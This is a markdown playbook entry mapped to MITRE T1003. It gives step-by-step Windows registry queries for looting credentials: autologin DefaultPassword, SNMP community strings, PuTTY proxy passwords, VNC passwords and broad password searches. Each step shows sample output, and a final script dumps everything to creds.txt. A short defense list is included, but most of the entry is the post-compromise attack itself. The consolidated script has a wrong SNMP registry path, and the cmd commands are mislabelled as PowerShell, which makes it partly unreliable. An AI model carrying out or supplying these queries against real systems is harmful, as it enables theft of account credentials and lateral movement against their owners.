---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/EoP - Looting for passwords]]'
  - '[[tags/Search the registry for key names and passwords]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/reg-query-hkcu-for-password]]'
  - '[[commands/reg-query-hkcu-for-password-variant]]'
  - '[[commands/reg-query-hkcu-for-password]]'
  - '[[commands/reg-query-hkcu-for-password-variant]]'
  - '[[commands/reg-query-winlogon-for-autologin-settings]]'
  - '[[commands/reg-query-winlogon-for-default-credentials]]'
  - '[[commands/reg-query-snmp-parameters]]'
  - '[[commands/reg-query-putty-sessions]]'
  - '[[commands/reg-query-vnc-password]]'
  - '[[commands/reg-query-realvnc-winvnc4-password]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-password-and-credential-query-via-registry

## Summary

This procedure extracts stored passwords, hashes, and credentials from the Windows registry by querying specific keys in HKLM and HKCU hives. It targets autologin settings, SNMP parameters, PuTTY proxy credentials, VNC passwords, and general password strings, enabling attackers to recover plaintext credentials for privilege escalation or lateral movement.

## Description

Attackers with administrative access can use built-in Windows tools like reg query to search the registry for sensitive data. The registry often stores credentials in plaintext or weakly protected forms, such as in Winlogon for autologin, SNMP community strings, or application-specific keys like PuTTY and VNC. This technique is effective on misconfigured Windows systems where legacy or default settings expose credentials. It requires local admin rights and is commonly used post-compromise for credential looting. Success yields usable credentials for further exploitation, but detection can occur via registry monitoring.

## Requirements

1. Administrative privileges on the target Windows system
2. Access to Command Prompt or PowerShell (no external tools required)
3. Target Windows version supporting reg query (Windows 7+)

## Defense

- Implement least privilege: Restrict admin access and use protected processes
- Monitor registry access: Enable auditing for registry keys like HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
- Use EDR tools: Detect anomalous reg query patterns or credential access
- Harden configurations: Disable autologin, use secure SNMPv3, and avoid plaintext storage in apps like PuTTY/VNC

## Objectives

1. Identify and extract plaintext passwords or credentials from registry keys
2. Recover autologin or service credentials for privilege escalation
3. Gather application-specific credentials (e.g., VNC, SNMP) for lateral movement

## Instructions

### Step 1: Search HKCU for Password Entries

**Context**: Query the current user's registry hive for any string values containing "password" to uncover user-specific credentials.

**Command** ([[commands/reg-query-hkcu-for-password]]):
```cmd
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```

> This searches HKCU recursively for REG_SZ values matching "password". If results show credentials, note the key path for manual inspection.

**Expected Output**: List of matching keys and values, e.g.,
```
HKEY_CURRENT_USER\Software\App\Config
    password    REG_SZ    secret123
```

### Step 2: Alternative Search in HKCU for Password Variants

**Context**: Perform a case-insensitive search in HKCU to catch variations in key naming, ensuring comprehensive coverage.

**Command** ([[commands/reg-query-hkcu-for-password-variant]]):
```cmd
reg query HKCU /f password /t REG_SZ /s
```

> Use lowercase flags for broader matching. Redirect output to a file if needed for analysis.

**Expected Output**: Similar to Step 1, but may include more hits due to flag differences, e.g.,
```
HKEY_CURRENT_USER\Software\ORL\WinVNC3
    Password    REG_SZ    encryptedpass
```

### Step 3: Search HKLM for Password Entries

**Context**: Query the local machine hive for system-wide credentials, such as service or autologin passwords.

**Command** ([[commands/reg-query-hkcu-for-password]]):
```cmd
REG QUERY HKLM /F "password" /t REG_SZ /S /K
```

> Focuses on machine-level storage. Look for hits in software or system keys.

**Expected Output**: System credential entries, e.g.,
```
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4
    password    REG_SZ    vncsecret
```

### Step 4: Alternative Search in HKLM for Password Variants

**Context**: Repeat the search with variant flags to ensure no misses in HKLM.

**Command** ([[commands/reg-query-hkcu-for-password-variant]]):
```cmd
reg query HKLM /f password /t REG_SZ /s
```

> Complements the uppercase search for completeness.

**Expected Output**: Additional or overlapping results from HKLM.

### Step 5: Query Winlogon for Autologin Settings

**Context**: Check for enabled autologin credentials, which store domain, username, and password in plaintext.

**Command** ([[commands/reg-query-winlogon-for-autologin-settings]]):
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

> Dumps the entire Winlogon key; inspect for AutoAdminLogon=1.

**Expected Output**:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    admin
```

### Step 6: Extract Default Credentials from Winlogon

**Context**: Filter Winlogon output specifically for username, domain, and password to quickly identify autologin creds.

**Command** ([[commands/reg-query-winlogon-for-default-credentials]]):
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

> Suppresses errors and filters for key values. If DefaultPassword exists, it's often plaintext.

**Expected Output**:
```
    DefaultUserName    REG_SZ    localadmin
    DefaultDomainName    REG_SZ    WORKGROUP
    DefaultPassword    REG_SZ    pass123
```

### Step 7: Query SNMP Parameters

**Context**: Extract SNMP community strings or credentials, which may be used for network enumeration.

**Command** ([[commands/reg-query-snmp-parameters]]):
```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
```

> Targets SNMP service keys for community strings (often "public" or custom).

**Expected Output**:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters
    PublicCommunity    REG_SZ    private
```

### Step 8: Query PuTTY Sessions for Proxy Credentials

**Context**: Retrieve saved PuTTY session data, which may include proxy passwords in cleartext.

**Command** ([[commands/reg-query-putty-sessions]]):
```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

> Dumps session keys; look for ProxyPassword values.

**Expected Output**:
```
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\MySession
    ProxyPassword    REG_SZ    proxypass
```

### Step 9: Query VNC Credentials

**Context**: Extract VNC server passwords from the user's registry.

**Command** ([[commands/reg-query-vnc-password]]):
```cmd
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

> Targets legacy WinVNC3 keys for stored passwords.

**Expected Output**:
```
HKEY_CURRENT_USER\Software\ORL\WinVNC3
    Password    REG_SZ    vnc123
```

### Step 10: Query RealVNC WinVNC4 Password

**Context**: Check for RealVNC-specific passwords in the machine hive.

**Command** ([[commands/reg-query-realvnc-winvnc4-password]]):
```cmd
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

> Directly queries the password value.

**Expected Output**:
```
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4
    password    REG_SZ    realvncpass
```

### Step 11: Execute Comprehensive Script

**Context**: Run a PowerShell script to automate all queries and consolidate output for review.

**Code** ([[codes/powershell-windows-registry-credential-search-script]]):
```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

> Save as .ps1 and execute in PowerShell. Redirect output to a file: `script.ps1 > creds.txt`.

**Expected Output**: Combined registry dumps with potential credential hits across all queried keys.
